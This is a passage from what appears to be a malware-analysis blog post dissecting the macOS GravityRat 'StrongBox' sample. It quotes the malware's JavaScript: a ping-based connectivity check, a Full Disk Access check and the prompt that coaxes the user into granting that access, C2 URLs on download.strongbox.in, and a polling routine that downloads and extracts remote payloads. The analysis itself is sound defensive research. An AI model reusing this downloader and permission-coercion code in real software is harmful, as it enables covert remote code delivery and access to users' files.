<p>However, it appears that perhaps there is bug in the malware&rsquo;s code, and an incorrect error message will be displayed &hellip; &ldquo;<em>Please check your internet connection and try again.</em>&rdquo;:</p>
<img src="../images/blog/blog_0x5C/alert.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(incorrect) Error Message</center>

<p>The <code>main.js</code> file also contains logic for a simple &ldquo;is connected&rdquo; check. Often malware performs such checks to ensure it can communicate with a remote command and control server, and/or to detect if it is perhaps executing on an offline analysis system.</p>
<p>To ascertain if it&rsquo;s running on an Internet connection system, the malware invokes a function named <code>connection</code> which simply attempts to ping <code>www.google.com</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connection</span>(){ 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#a6e22e">execRoot</span>(<span style="color:#e6db74">&#39;ping -t 4 www.google.com&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">error</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">error</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>           <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>           <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>           <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>           <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Internet Connectivity Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>           <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>           <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Sorry! Please check your internet connectivity and try again.&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>         };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>         <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>         });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>   } });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>}</span></span></code></pre></div>
<p>Via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process Monitor</a>, we can observe this execution of the <code>ping</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
...

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 501,
    "arguments" : [
      "ping",
      "-t",
      "4",
      "www.google.com"
    ],
    "ppid" : 1447,
    "ancestors" : [
      1447,
      1
    ],
    "path" : "/sbin/ping",
    ...
  }
}

</pre>
</div>
<p>Lastly the <code>main.js</code> function checks if the malware has been granted Full Disk Access (FDA).</p>
<div class="note">
<p>On recent versions of macOS, applications are prevented from accessing various user/system files, unless the user has manually granted the application &ldquo;Full Disk Access&rdquo; (via the System Preferences application).</p>
<p>As such, malware that desires indiscriminate file system access may attempt to coerce users into granting such access.</p>
</div>
<p>In order to check if has Full Disk Access, <code>GravityRat</code> attempts to list the files in the <code>~/Library/Safari</code>. As this directory is inaccessible to applications without FDA, this is sufficient check. If the malware determines it does not have FDA, it will prompt to the user to grant such access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ressslt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">execRoot</span>(<span style="color:#e6db74">&#39;ls ~/Library/Safari&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">stderr</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBox - Operation Not Permitted&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Please follow the instructions to resolve this issue
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#e6db74">                     System Preferences -&gt; Security &amp; Privacy -&gt; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#e6db74">                            Full Disk Access to Terminal.app&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>          };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>          <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>            <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>          });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>          
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  } });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>}</span></span></code></pre></div>
<p>In the <code>StrongBox</code> sample, the <code>main.js</code> file contains logic related to environmental checks (i.e. VM &amp; FDA checks), the core of the malicious logic appears in the <code>signature.js</code> file. As such, let&rsquo;s now we dive into the <code>signature.js</code> file.</p>
<p>At the start of the <code>signature.js</code> file we find various variables being initialized:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">srur</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://download.strongbox.in/strongbox/&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">srdr</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://download.strongbox.in/A0B74607.php&#39;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loclpth</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">app1</span>.<span style="color:#a6e22e">getPath</span>(<span style="color:#e6db74">&#39;appData&#39;</span>), <span style="color:#e6db74">&#39;/SCloud&#39;</span>);</span></span></code></pre></div>
<p>These variable appear to the malware&rsquo;s command and control server and a directory path, found within the user application data directory (that we&rsquo;ll see is used for persistence).</p>
<div class="note">
<p>The malware&rsquo;s server, download.strongbox.in, appears to be now offline:</p>
<p>$ nslookup download.strongbox.in
Server:   8.8.8.8
Address:  8.8.8.8#53</p>
<p>** server can&rsquo;t find download.strongbox.in: SERVFAIL</p>
</div>
<br>
<div class="note">
<p>The code snippet, getPath(&lsquo;appData&rsquo;), will return the &ldquo;Per-user application data directory&rdquo;, which on macOS points to ~/Library/Application Support.</p>
</div>
<p>If needed, the malware then will create the directory specified in the <code>loclpth</code> variable (<code>~/Library/Application Support/SCloud</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">loclpth</span>)){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">mkdirSync</span>(<span style="color:#a6e22e">loclpth</span>,<span style="color:#ae81ff">0700</span>);</span></span></code></pre></div>
<p>Further down in the <code>signature.js</code> file, we can see the malware invoking a function named <code>updates</code> via the <code>setInterval</code> API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">setInterval</span>(<span style="color:#a6e22e">updates</span>,<span style="color:#ae81ff">180000</span>)  
</span></span></code></pre></div>
<p>As its name implies, the <code>updates</code> will download a file (and &ldquo;update&rdquo;) from the server specified in the <code>srdr</code> variable (<code>https://download.strongbox.in/A0B74607.php</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">updates</span>()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">insst</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">create</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">store</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;Hash&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">srdr</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;update&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">hash</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        })
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">response</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">respns</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">data</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">respns</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rply</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">respns</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;#&#39;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rply</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">trim</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">agentTask</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rply</span>[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dpath</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">createWriteStream</span>(<span style="color:#a6e22e">dpath</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">https</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">srur</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;Updates/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">fname</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">response</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>  <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">file</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;finish&#39;</span>, <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#a6e22e">getDateTime</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#a6e22e">extractzip1</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>}</span></span></code></pre></div>
<p>If this remote server (<code>https://download.strongbox.in/A0B74607.php</code>), provides a payload for download, the malware will then invoke the <code>extractzip1</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">extractzip1</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sourceTozip</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fname</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#a6e22e">sourceTozip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.zip&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">rename</span>(<span style="color:#a6e22e">source</span>, <span style="color:#a6e22e">sourceTozip</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">osvar</span>.<span style="color:#a6e22e">trim</span>()<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;darwin&#34;</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">extract</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;extract-zip&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    <span style="color:#a6e22e">extract</span>(<span style="color:#a6e22e">sourceTozip</span>, {<span style="color:#a6e22e">dir</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">target</span>}, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>     
